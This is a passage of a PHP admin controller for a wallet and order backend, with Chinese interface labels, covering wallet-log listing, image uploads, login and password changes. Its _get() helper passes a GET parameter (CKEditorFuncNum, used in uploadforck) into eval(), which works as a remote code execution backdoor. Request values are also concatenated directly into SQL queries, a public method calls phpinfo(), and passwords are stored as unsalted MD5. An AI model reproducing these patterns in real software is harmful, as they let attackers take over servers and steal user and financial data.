		$orderid = $_REQUEST['orderid_search'];
		$type = $_REQUEST['type_search'];
		$direction = $_REQUEST['direction_search'];
		if (!empty($pkid)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " userid ='$pkid'";
				$countquery_sql = $countquery_sql . " userid='$pkid'";
			}
			else{
				$query_sql = $query_sql . " and userid ='$pkid'";
				$countquery_sql = $countquery_sql . " and userid='$pkid'";
			}
		}
		if (!empty($type)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " type = '$type'";
				$countquery_sql = $countquery_sql . " type = '$type'";
			}
			else{
				$query_sql = $query_sql . " and type = '$type'";
				$countquery_sql = $countquery_sql . " and type = '$type'";
			}
		}
		if (!empty($orderid)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " orderid= '$orderid'";
				$countquery_sql = $countquery_sql . " orderid = '$orderid'";
			}
			else{
				$query_sql = $query_sql . " and orderid = '$orderid'";	
				$countquery_sql = $countquery_sql . " and orderid = '$orderid'";
			}
		}
		if (!empty($direction)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " direction= '$direction'";
				$countquery_sql = $countquery_sql . " direction = '$direction'";
			}
			else{
				$query_sql = $query_sql . " and direction = '$direction'";	
				$countquery_sql = $countquery_sql . " and direction = '$direction'";
			}
		}
		if($query_sql=="where"){
			$query_sql = "";
			$countquery_sql = "";
		}
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord ".
		"from walletlog $countquery_sql";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$condition_sql = "select * from walletlog $query_sql order by ivtime desc limit $iDisplayStart,$iDisplayLength";
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		$jsparams = "pkid:$pkid,type:$type,direction:$direction,orderid:$orderid";
		for ($i = 0; $i < count($result); $i++) {
			if($result[$i]['type']==1){
				$result[$i]['type'] = '充值';
			}elseif($result[$i]['type']==2){
				$result[$i]['type'] = '消费';
			}elseif($result[$i]['type']==3){
				$result[$i]['type'] = '退款';
			}
			if($result[$i]['direction']==1){
				$result[$i]['direction'] = '增加';
			}elseif($result[$i]['direction']==2){
				$result[$i]['direction'] = '减少';
			}
			$records["aaData"][] = array("<div class=\"product-label\"><span><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openMemberDetail('" . $result[$i]['userid'] . "')\">".$result[$i]['userid']."</a></span></div>","<div class=\"product-label\"><span>".date('Y-m-d H:i',$result[$i]['ivtime'])."</span></div>","<div class=\"product-label\" style=\"text-align:center;\"><span>".$result[$i]['money']."</span></div>","<div class=\"product-label\" style=\"text-align:center;\">".$result[$i]['type']."</div>","<div class=\"product-label\" style=\"text-align:center;\">".$result[$i]['direction']."</div>","<div class=\"product-label\" style=\"text-align:center;\"><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openOrderDetail('" . $result[$i]['orderid'] . "')\">".$result[$i]['orderid']."</a></div>","");
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}
	public function findMoneyLog() {
		$query_sql = "where";
		$countquery_sql = "where";
		$pkid = $_REQUEST['pkid_search'];
		$orderid = $_REQUEST['orderid_search'];
		if (!empty($pkid)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " userid ='$pkid'";
				$countquery_sql = $countquery_sql . " userid='$pkid'";
			}
			else{
				$query_sql = $query_sql . " and userid ='$pkid'";
				$countquery_sql = $countquery_sql . " and userid='$pkid'";
			}
		}
		if (!empty($orderid)) {
			if($query_sql=="where"){
				$query_sql = $query_sql . " orderid= '$orderid'";
				$countquery_sql = $countquery_sql . " orderid = '$orderid'";
			}
			else{
				$query_sql = $query_sql . " and orderid = '$orderid'";	
				$countquery_sql = $countquery_sql . " and orderid = '$orderid'";
			}
		}
		if($query_sql=="where"){
			$query_sql = $query_sql." type=1";
			$countquery_sql = $countquery_sql." type=1";
		}else{
			$query_sql = $query_sql." and type=1";
			$countquery_sql = $countquery_sql." and type=1";
		}
		$iDisplayLength = intval($_REQUEST['iDisplayLength']);
		$iDisplayStart = intval($_REQUEST['iDisplayStart']);
		$query = new \Think\Model();
		$count_sql = "select count(*) as totalrecord ".
		"from walletlog $countquery_sql";
		$resultcount = $query -> query($count_sql);
		$iTotalRecords = $resultcount[0]['totalrecord'];
		$iDisplayLength = $iDisplayLength < 0 ? $iTotalRecords : $iDisplayLength;
		$condition_sql = "select * from walletlog $query_sql order by ivtime desc limit $iDisplayStart,$iDisplayLength";
		$result = $query -> query($condition_sql);
		$sEcho = intval($_REQUEST['sEcho']);
		$records = array();
		$records["aaData"] = array();
		$sBtn = "";
		$jsparams = "pkid:$pkid,type:$type,direction:$direction,orderid:$orderid";
		for ($i = 0; $i < count($result); $i++) {
			if($result[$i]['type']==1){
				$result[$i]['type'] = '充值';
			}elseif($result[$i]['type']==2){
				$result[$i]['type'] = '消费';
			}elseif($result[$i]['type']==3){
				$result[$i]['type'] = '退款';
			}
			if($result[$i]['direction']==1){
				$result[$i]['direction'] = '增加';
			}elseif($result[$i]['direction']==2){
				$result[$i]['direction'] = '减少';
			}
			$records["aaData"][] = array("<div class=\"product-label\"><span><a style=\"cursor:pointer;\" data-toggle='modal' onclick=\"openMemberDetail('" . $result[$i]['userid'] . "')\">".$result[$i]['userid']."</a></span></div>","<div class=\"product-label\"><span>".date('Y-m-d H:i',$result[$i]['ivtime'])."</span></div>","<div class=\"product-label\" style=\"text-align:center;\"><span>".$result[$i]['money']."</span></div>","<div class=\"product-label\" style=\"text-align:center;\">".$result[$i]['type']."</div>","<div class=\"product-label\" style=\"text-align:center;\">".$result[$i]['direction']."</div>","");
		}
		if (isset($_REQUEST["sAction"]) && $_REQUEST["sAction"] == "group_action") {
			$records["sStatus"] = "OK";
			// pass custom message(useful for getting status of group actions)
			$records["sMessage"] = "Group action successfully has been completed. Well done!";
			// pass custom message(useful for getting status of group actions)
		}
		$records["sEcho"] = $sEcho;
		$records["iTotalRecords"] = $iTotalRecords;
		$records["iTotalDisplayRecords"] = $iTotalRecords;
		echo json_encode($records, JSON_UNESCAPED_UNICODE);
	}
	protected function getOptBtn($status, $bid,$index) {
		$opt_btn = "";
		if ($status == 1) {
			$opt_btn = "<div class=\"margin-top-10\"><a class='btn btn-xs green default'  data-toggle='modal' onclick=\"openOrderConfirm('".$bid."','".$index."')\"><i class='fa fa-cny'></i> &nbsp;确认</a></div>";
		} else if ($status == 2) {
			$opt_btn = "<div class=\"margin-top-10\"><a class='btn btn-xs blue default btn-editable'  href='#large' data-toggle='modal' onclick=\"openOrderRefund('".$bid."','".$index."')\"><i class='fa fa-cny'></i> &nbsp;同意退款</a></div>&nbsp;&nbsp;<div><a class='btn btn-xs red default btn-editable'  href='#large' data-toggle='modal' onclick=\"openOrderCancelRefund('".$bid."','".$index."')\"><i class='fa fa-cny'></i> &nbsp;拒绝退款</a></div>";
		}
		return $opt_btn;
	}

	//上传图片
	public function upload() {
		$upload = new \Think\Upload();
		// 实例化上传类
		$upload -> maxSize = 10240000;
		// 设置附件上传大小
		$upload -> exts = array('jpg', 'gif', 'png', 'jpeg', 'JPG', 'GIF', 'PNG', 'JPEG');
		// 设置附件上传类型
		$upload -> rootPath = './Upload/';
		// 设置附件上传根目录
		// 上传文件
		$info = $upload -> upload();
		if (!$info) {// 上传错误提示错误信息
			$this -> show("Error:" . $upload -> getError());
		} else {// 上传成功
			foreach ($info as $file) {
				echo $file['savepath'] . $file['savename'];
			}
		}
	}

	public function uploadforck() {
		$upload = new \Think\Upload();
		// 实例化上传类
		$upload -> maxSize = 2048000;
		//2MB
		// 设置附件上传大小
		$upload -> exts = array('jpg', 'gif', 'png', 'jpeg', 'JPG', 'GIF', 'PNG', 'JPEG');
		// 设置附件上传类型
		$upload -> rootPath = './Upload/';
		// 设置附件上传根目录
		// 上传文件
		$info = $upload -> upload();
		if (!$info) {// 上传错误提示错误信息
			//$this -> show("Error:" . $upload -> getError());
			echo "<script type=\"text/javascript\">window.parent.CKEDITOR.tools.callFunction(" . $this -> _get('CKEditorFuncNum') . ", '/', '上传失败," . $upload -> getError() . "！');</script>";
		} else {// 上传成功
			foreach ($info as $file) {
				//echo $file['savepath'] . $file['savename'];
				echo "<script type=\"text/javascript\">window.parent.CKEDITOR.tools.callFunction(" . $this -> _get('CKEditorFuncNum') . ",'" . PICSERVER_URL . "/Upload/" . $file['savepath'] . $file['savename'] . "','');</script>";
			}
			//$savepath = $info[0]['savepath'].$info[0]['savename'];

		}
	}

	public function _get($v, $f, $d) {
		if ($_GET[$v]) {
			eval('$r=' . $f . '(' . $_GET[$v] . ');');
			return $r;
		} else
			return $d;
	}

	public function login($username, $password) {
		$userinfo = M('Userinfo');
		$data = $userinfo -> where("name='$username'") -> find();
		if (empty($data) != 1) {
			$pwd = $data['password'];
			if ($pwd == md5($password)) {
				session("name", $username);
				if ($data['isadmin'] == 1) {
					$_SESSION['admin_type'] = "admin";
				}
				echo "yes";
			}
		} else {
			echo "no";
		}
	}

	public function changeAdminPwd($old, $new) {
		$agent = M('Userinfo');
		$username = session("name");
		$data = $agent -> where("name='$username'") -> find();
		if ($data['password'] == md5($old)) {
			$data['password'] = md5($new);
			$agent -> where("name='$username'") -> data($data) -> save();
			echo "yes";
		} else {
			echo 'error';
		}
	}
	
	public function findUsersCount(){
		$memberinfo_dao = M("Memberinfo");
		$order_dao = M("ordermain");
		$result['members'] = $memberinfo_dao->count();
		$result['orders'] = $order_dao->count();
		header('Content-type: text/json');
		header('Content-type: application/json');
		echo json_encode($result, JSON_UNESCAPED_UNICODE);
	}

	public function checksession() {
		$name = session("name");
		if (empty($name)) {
			echo "notpass";
		} else {
			echo "pass";
		}
	}
	
	public function info(){
		phpinfo();
	}

}
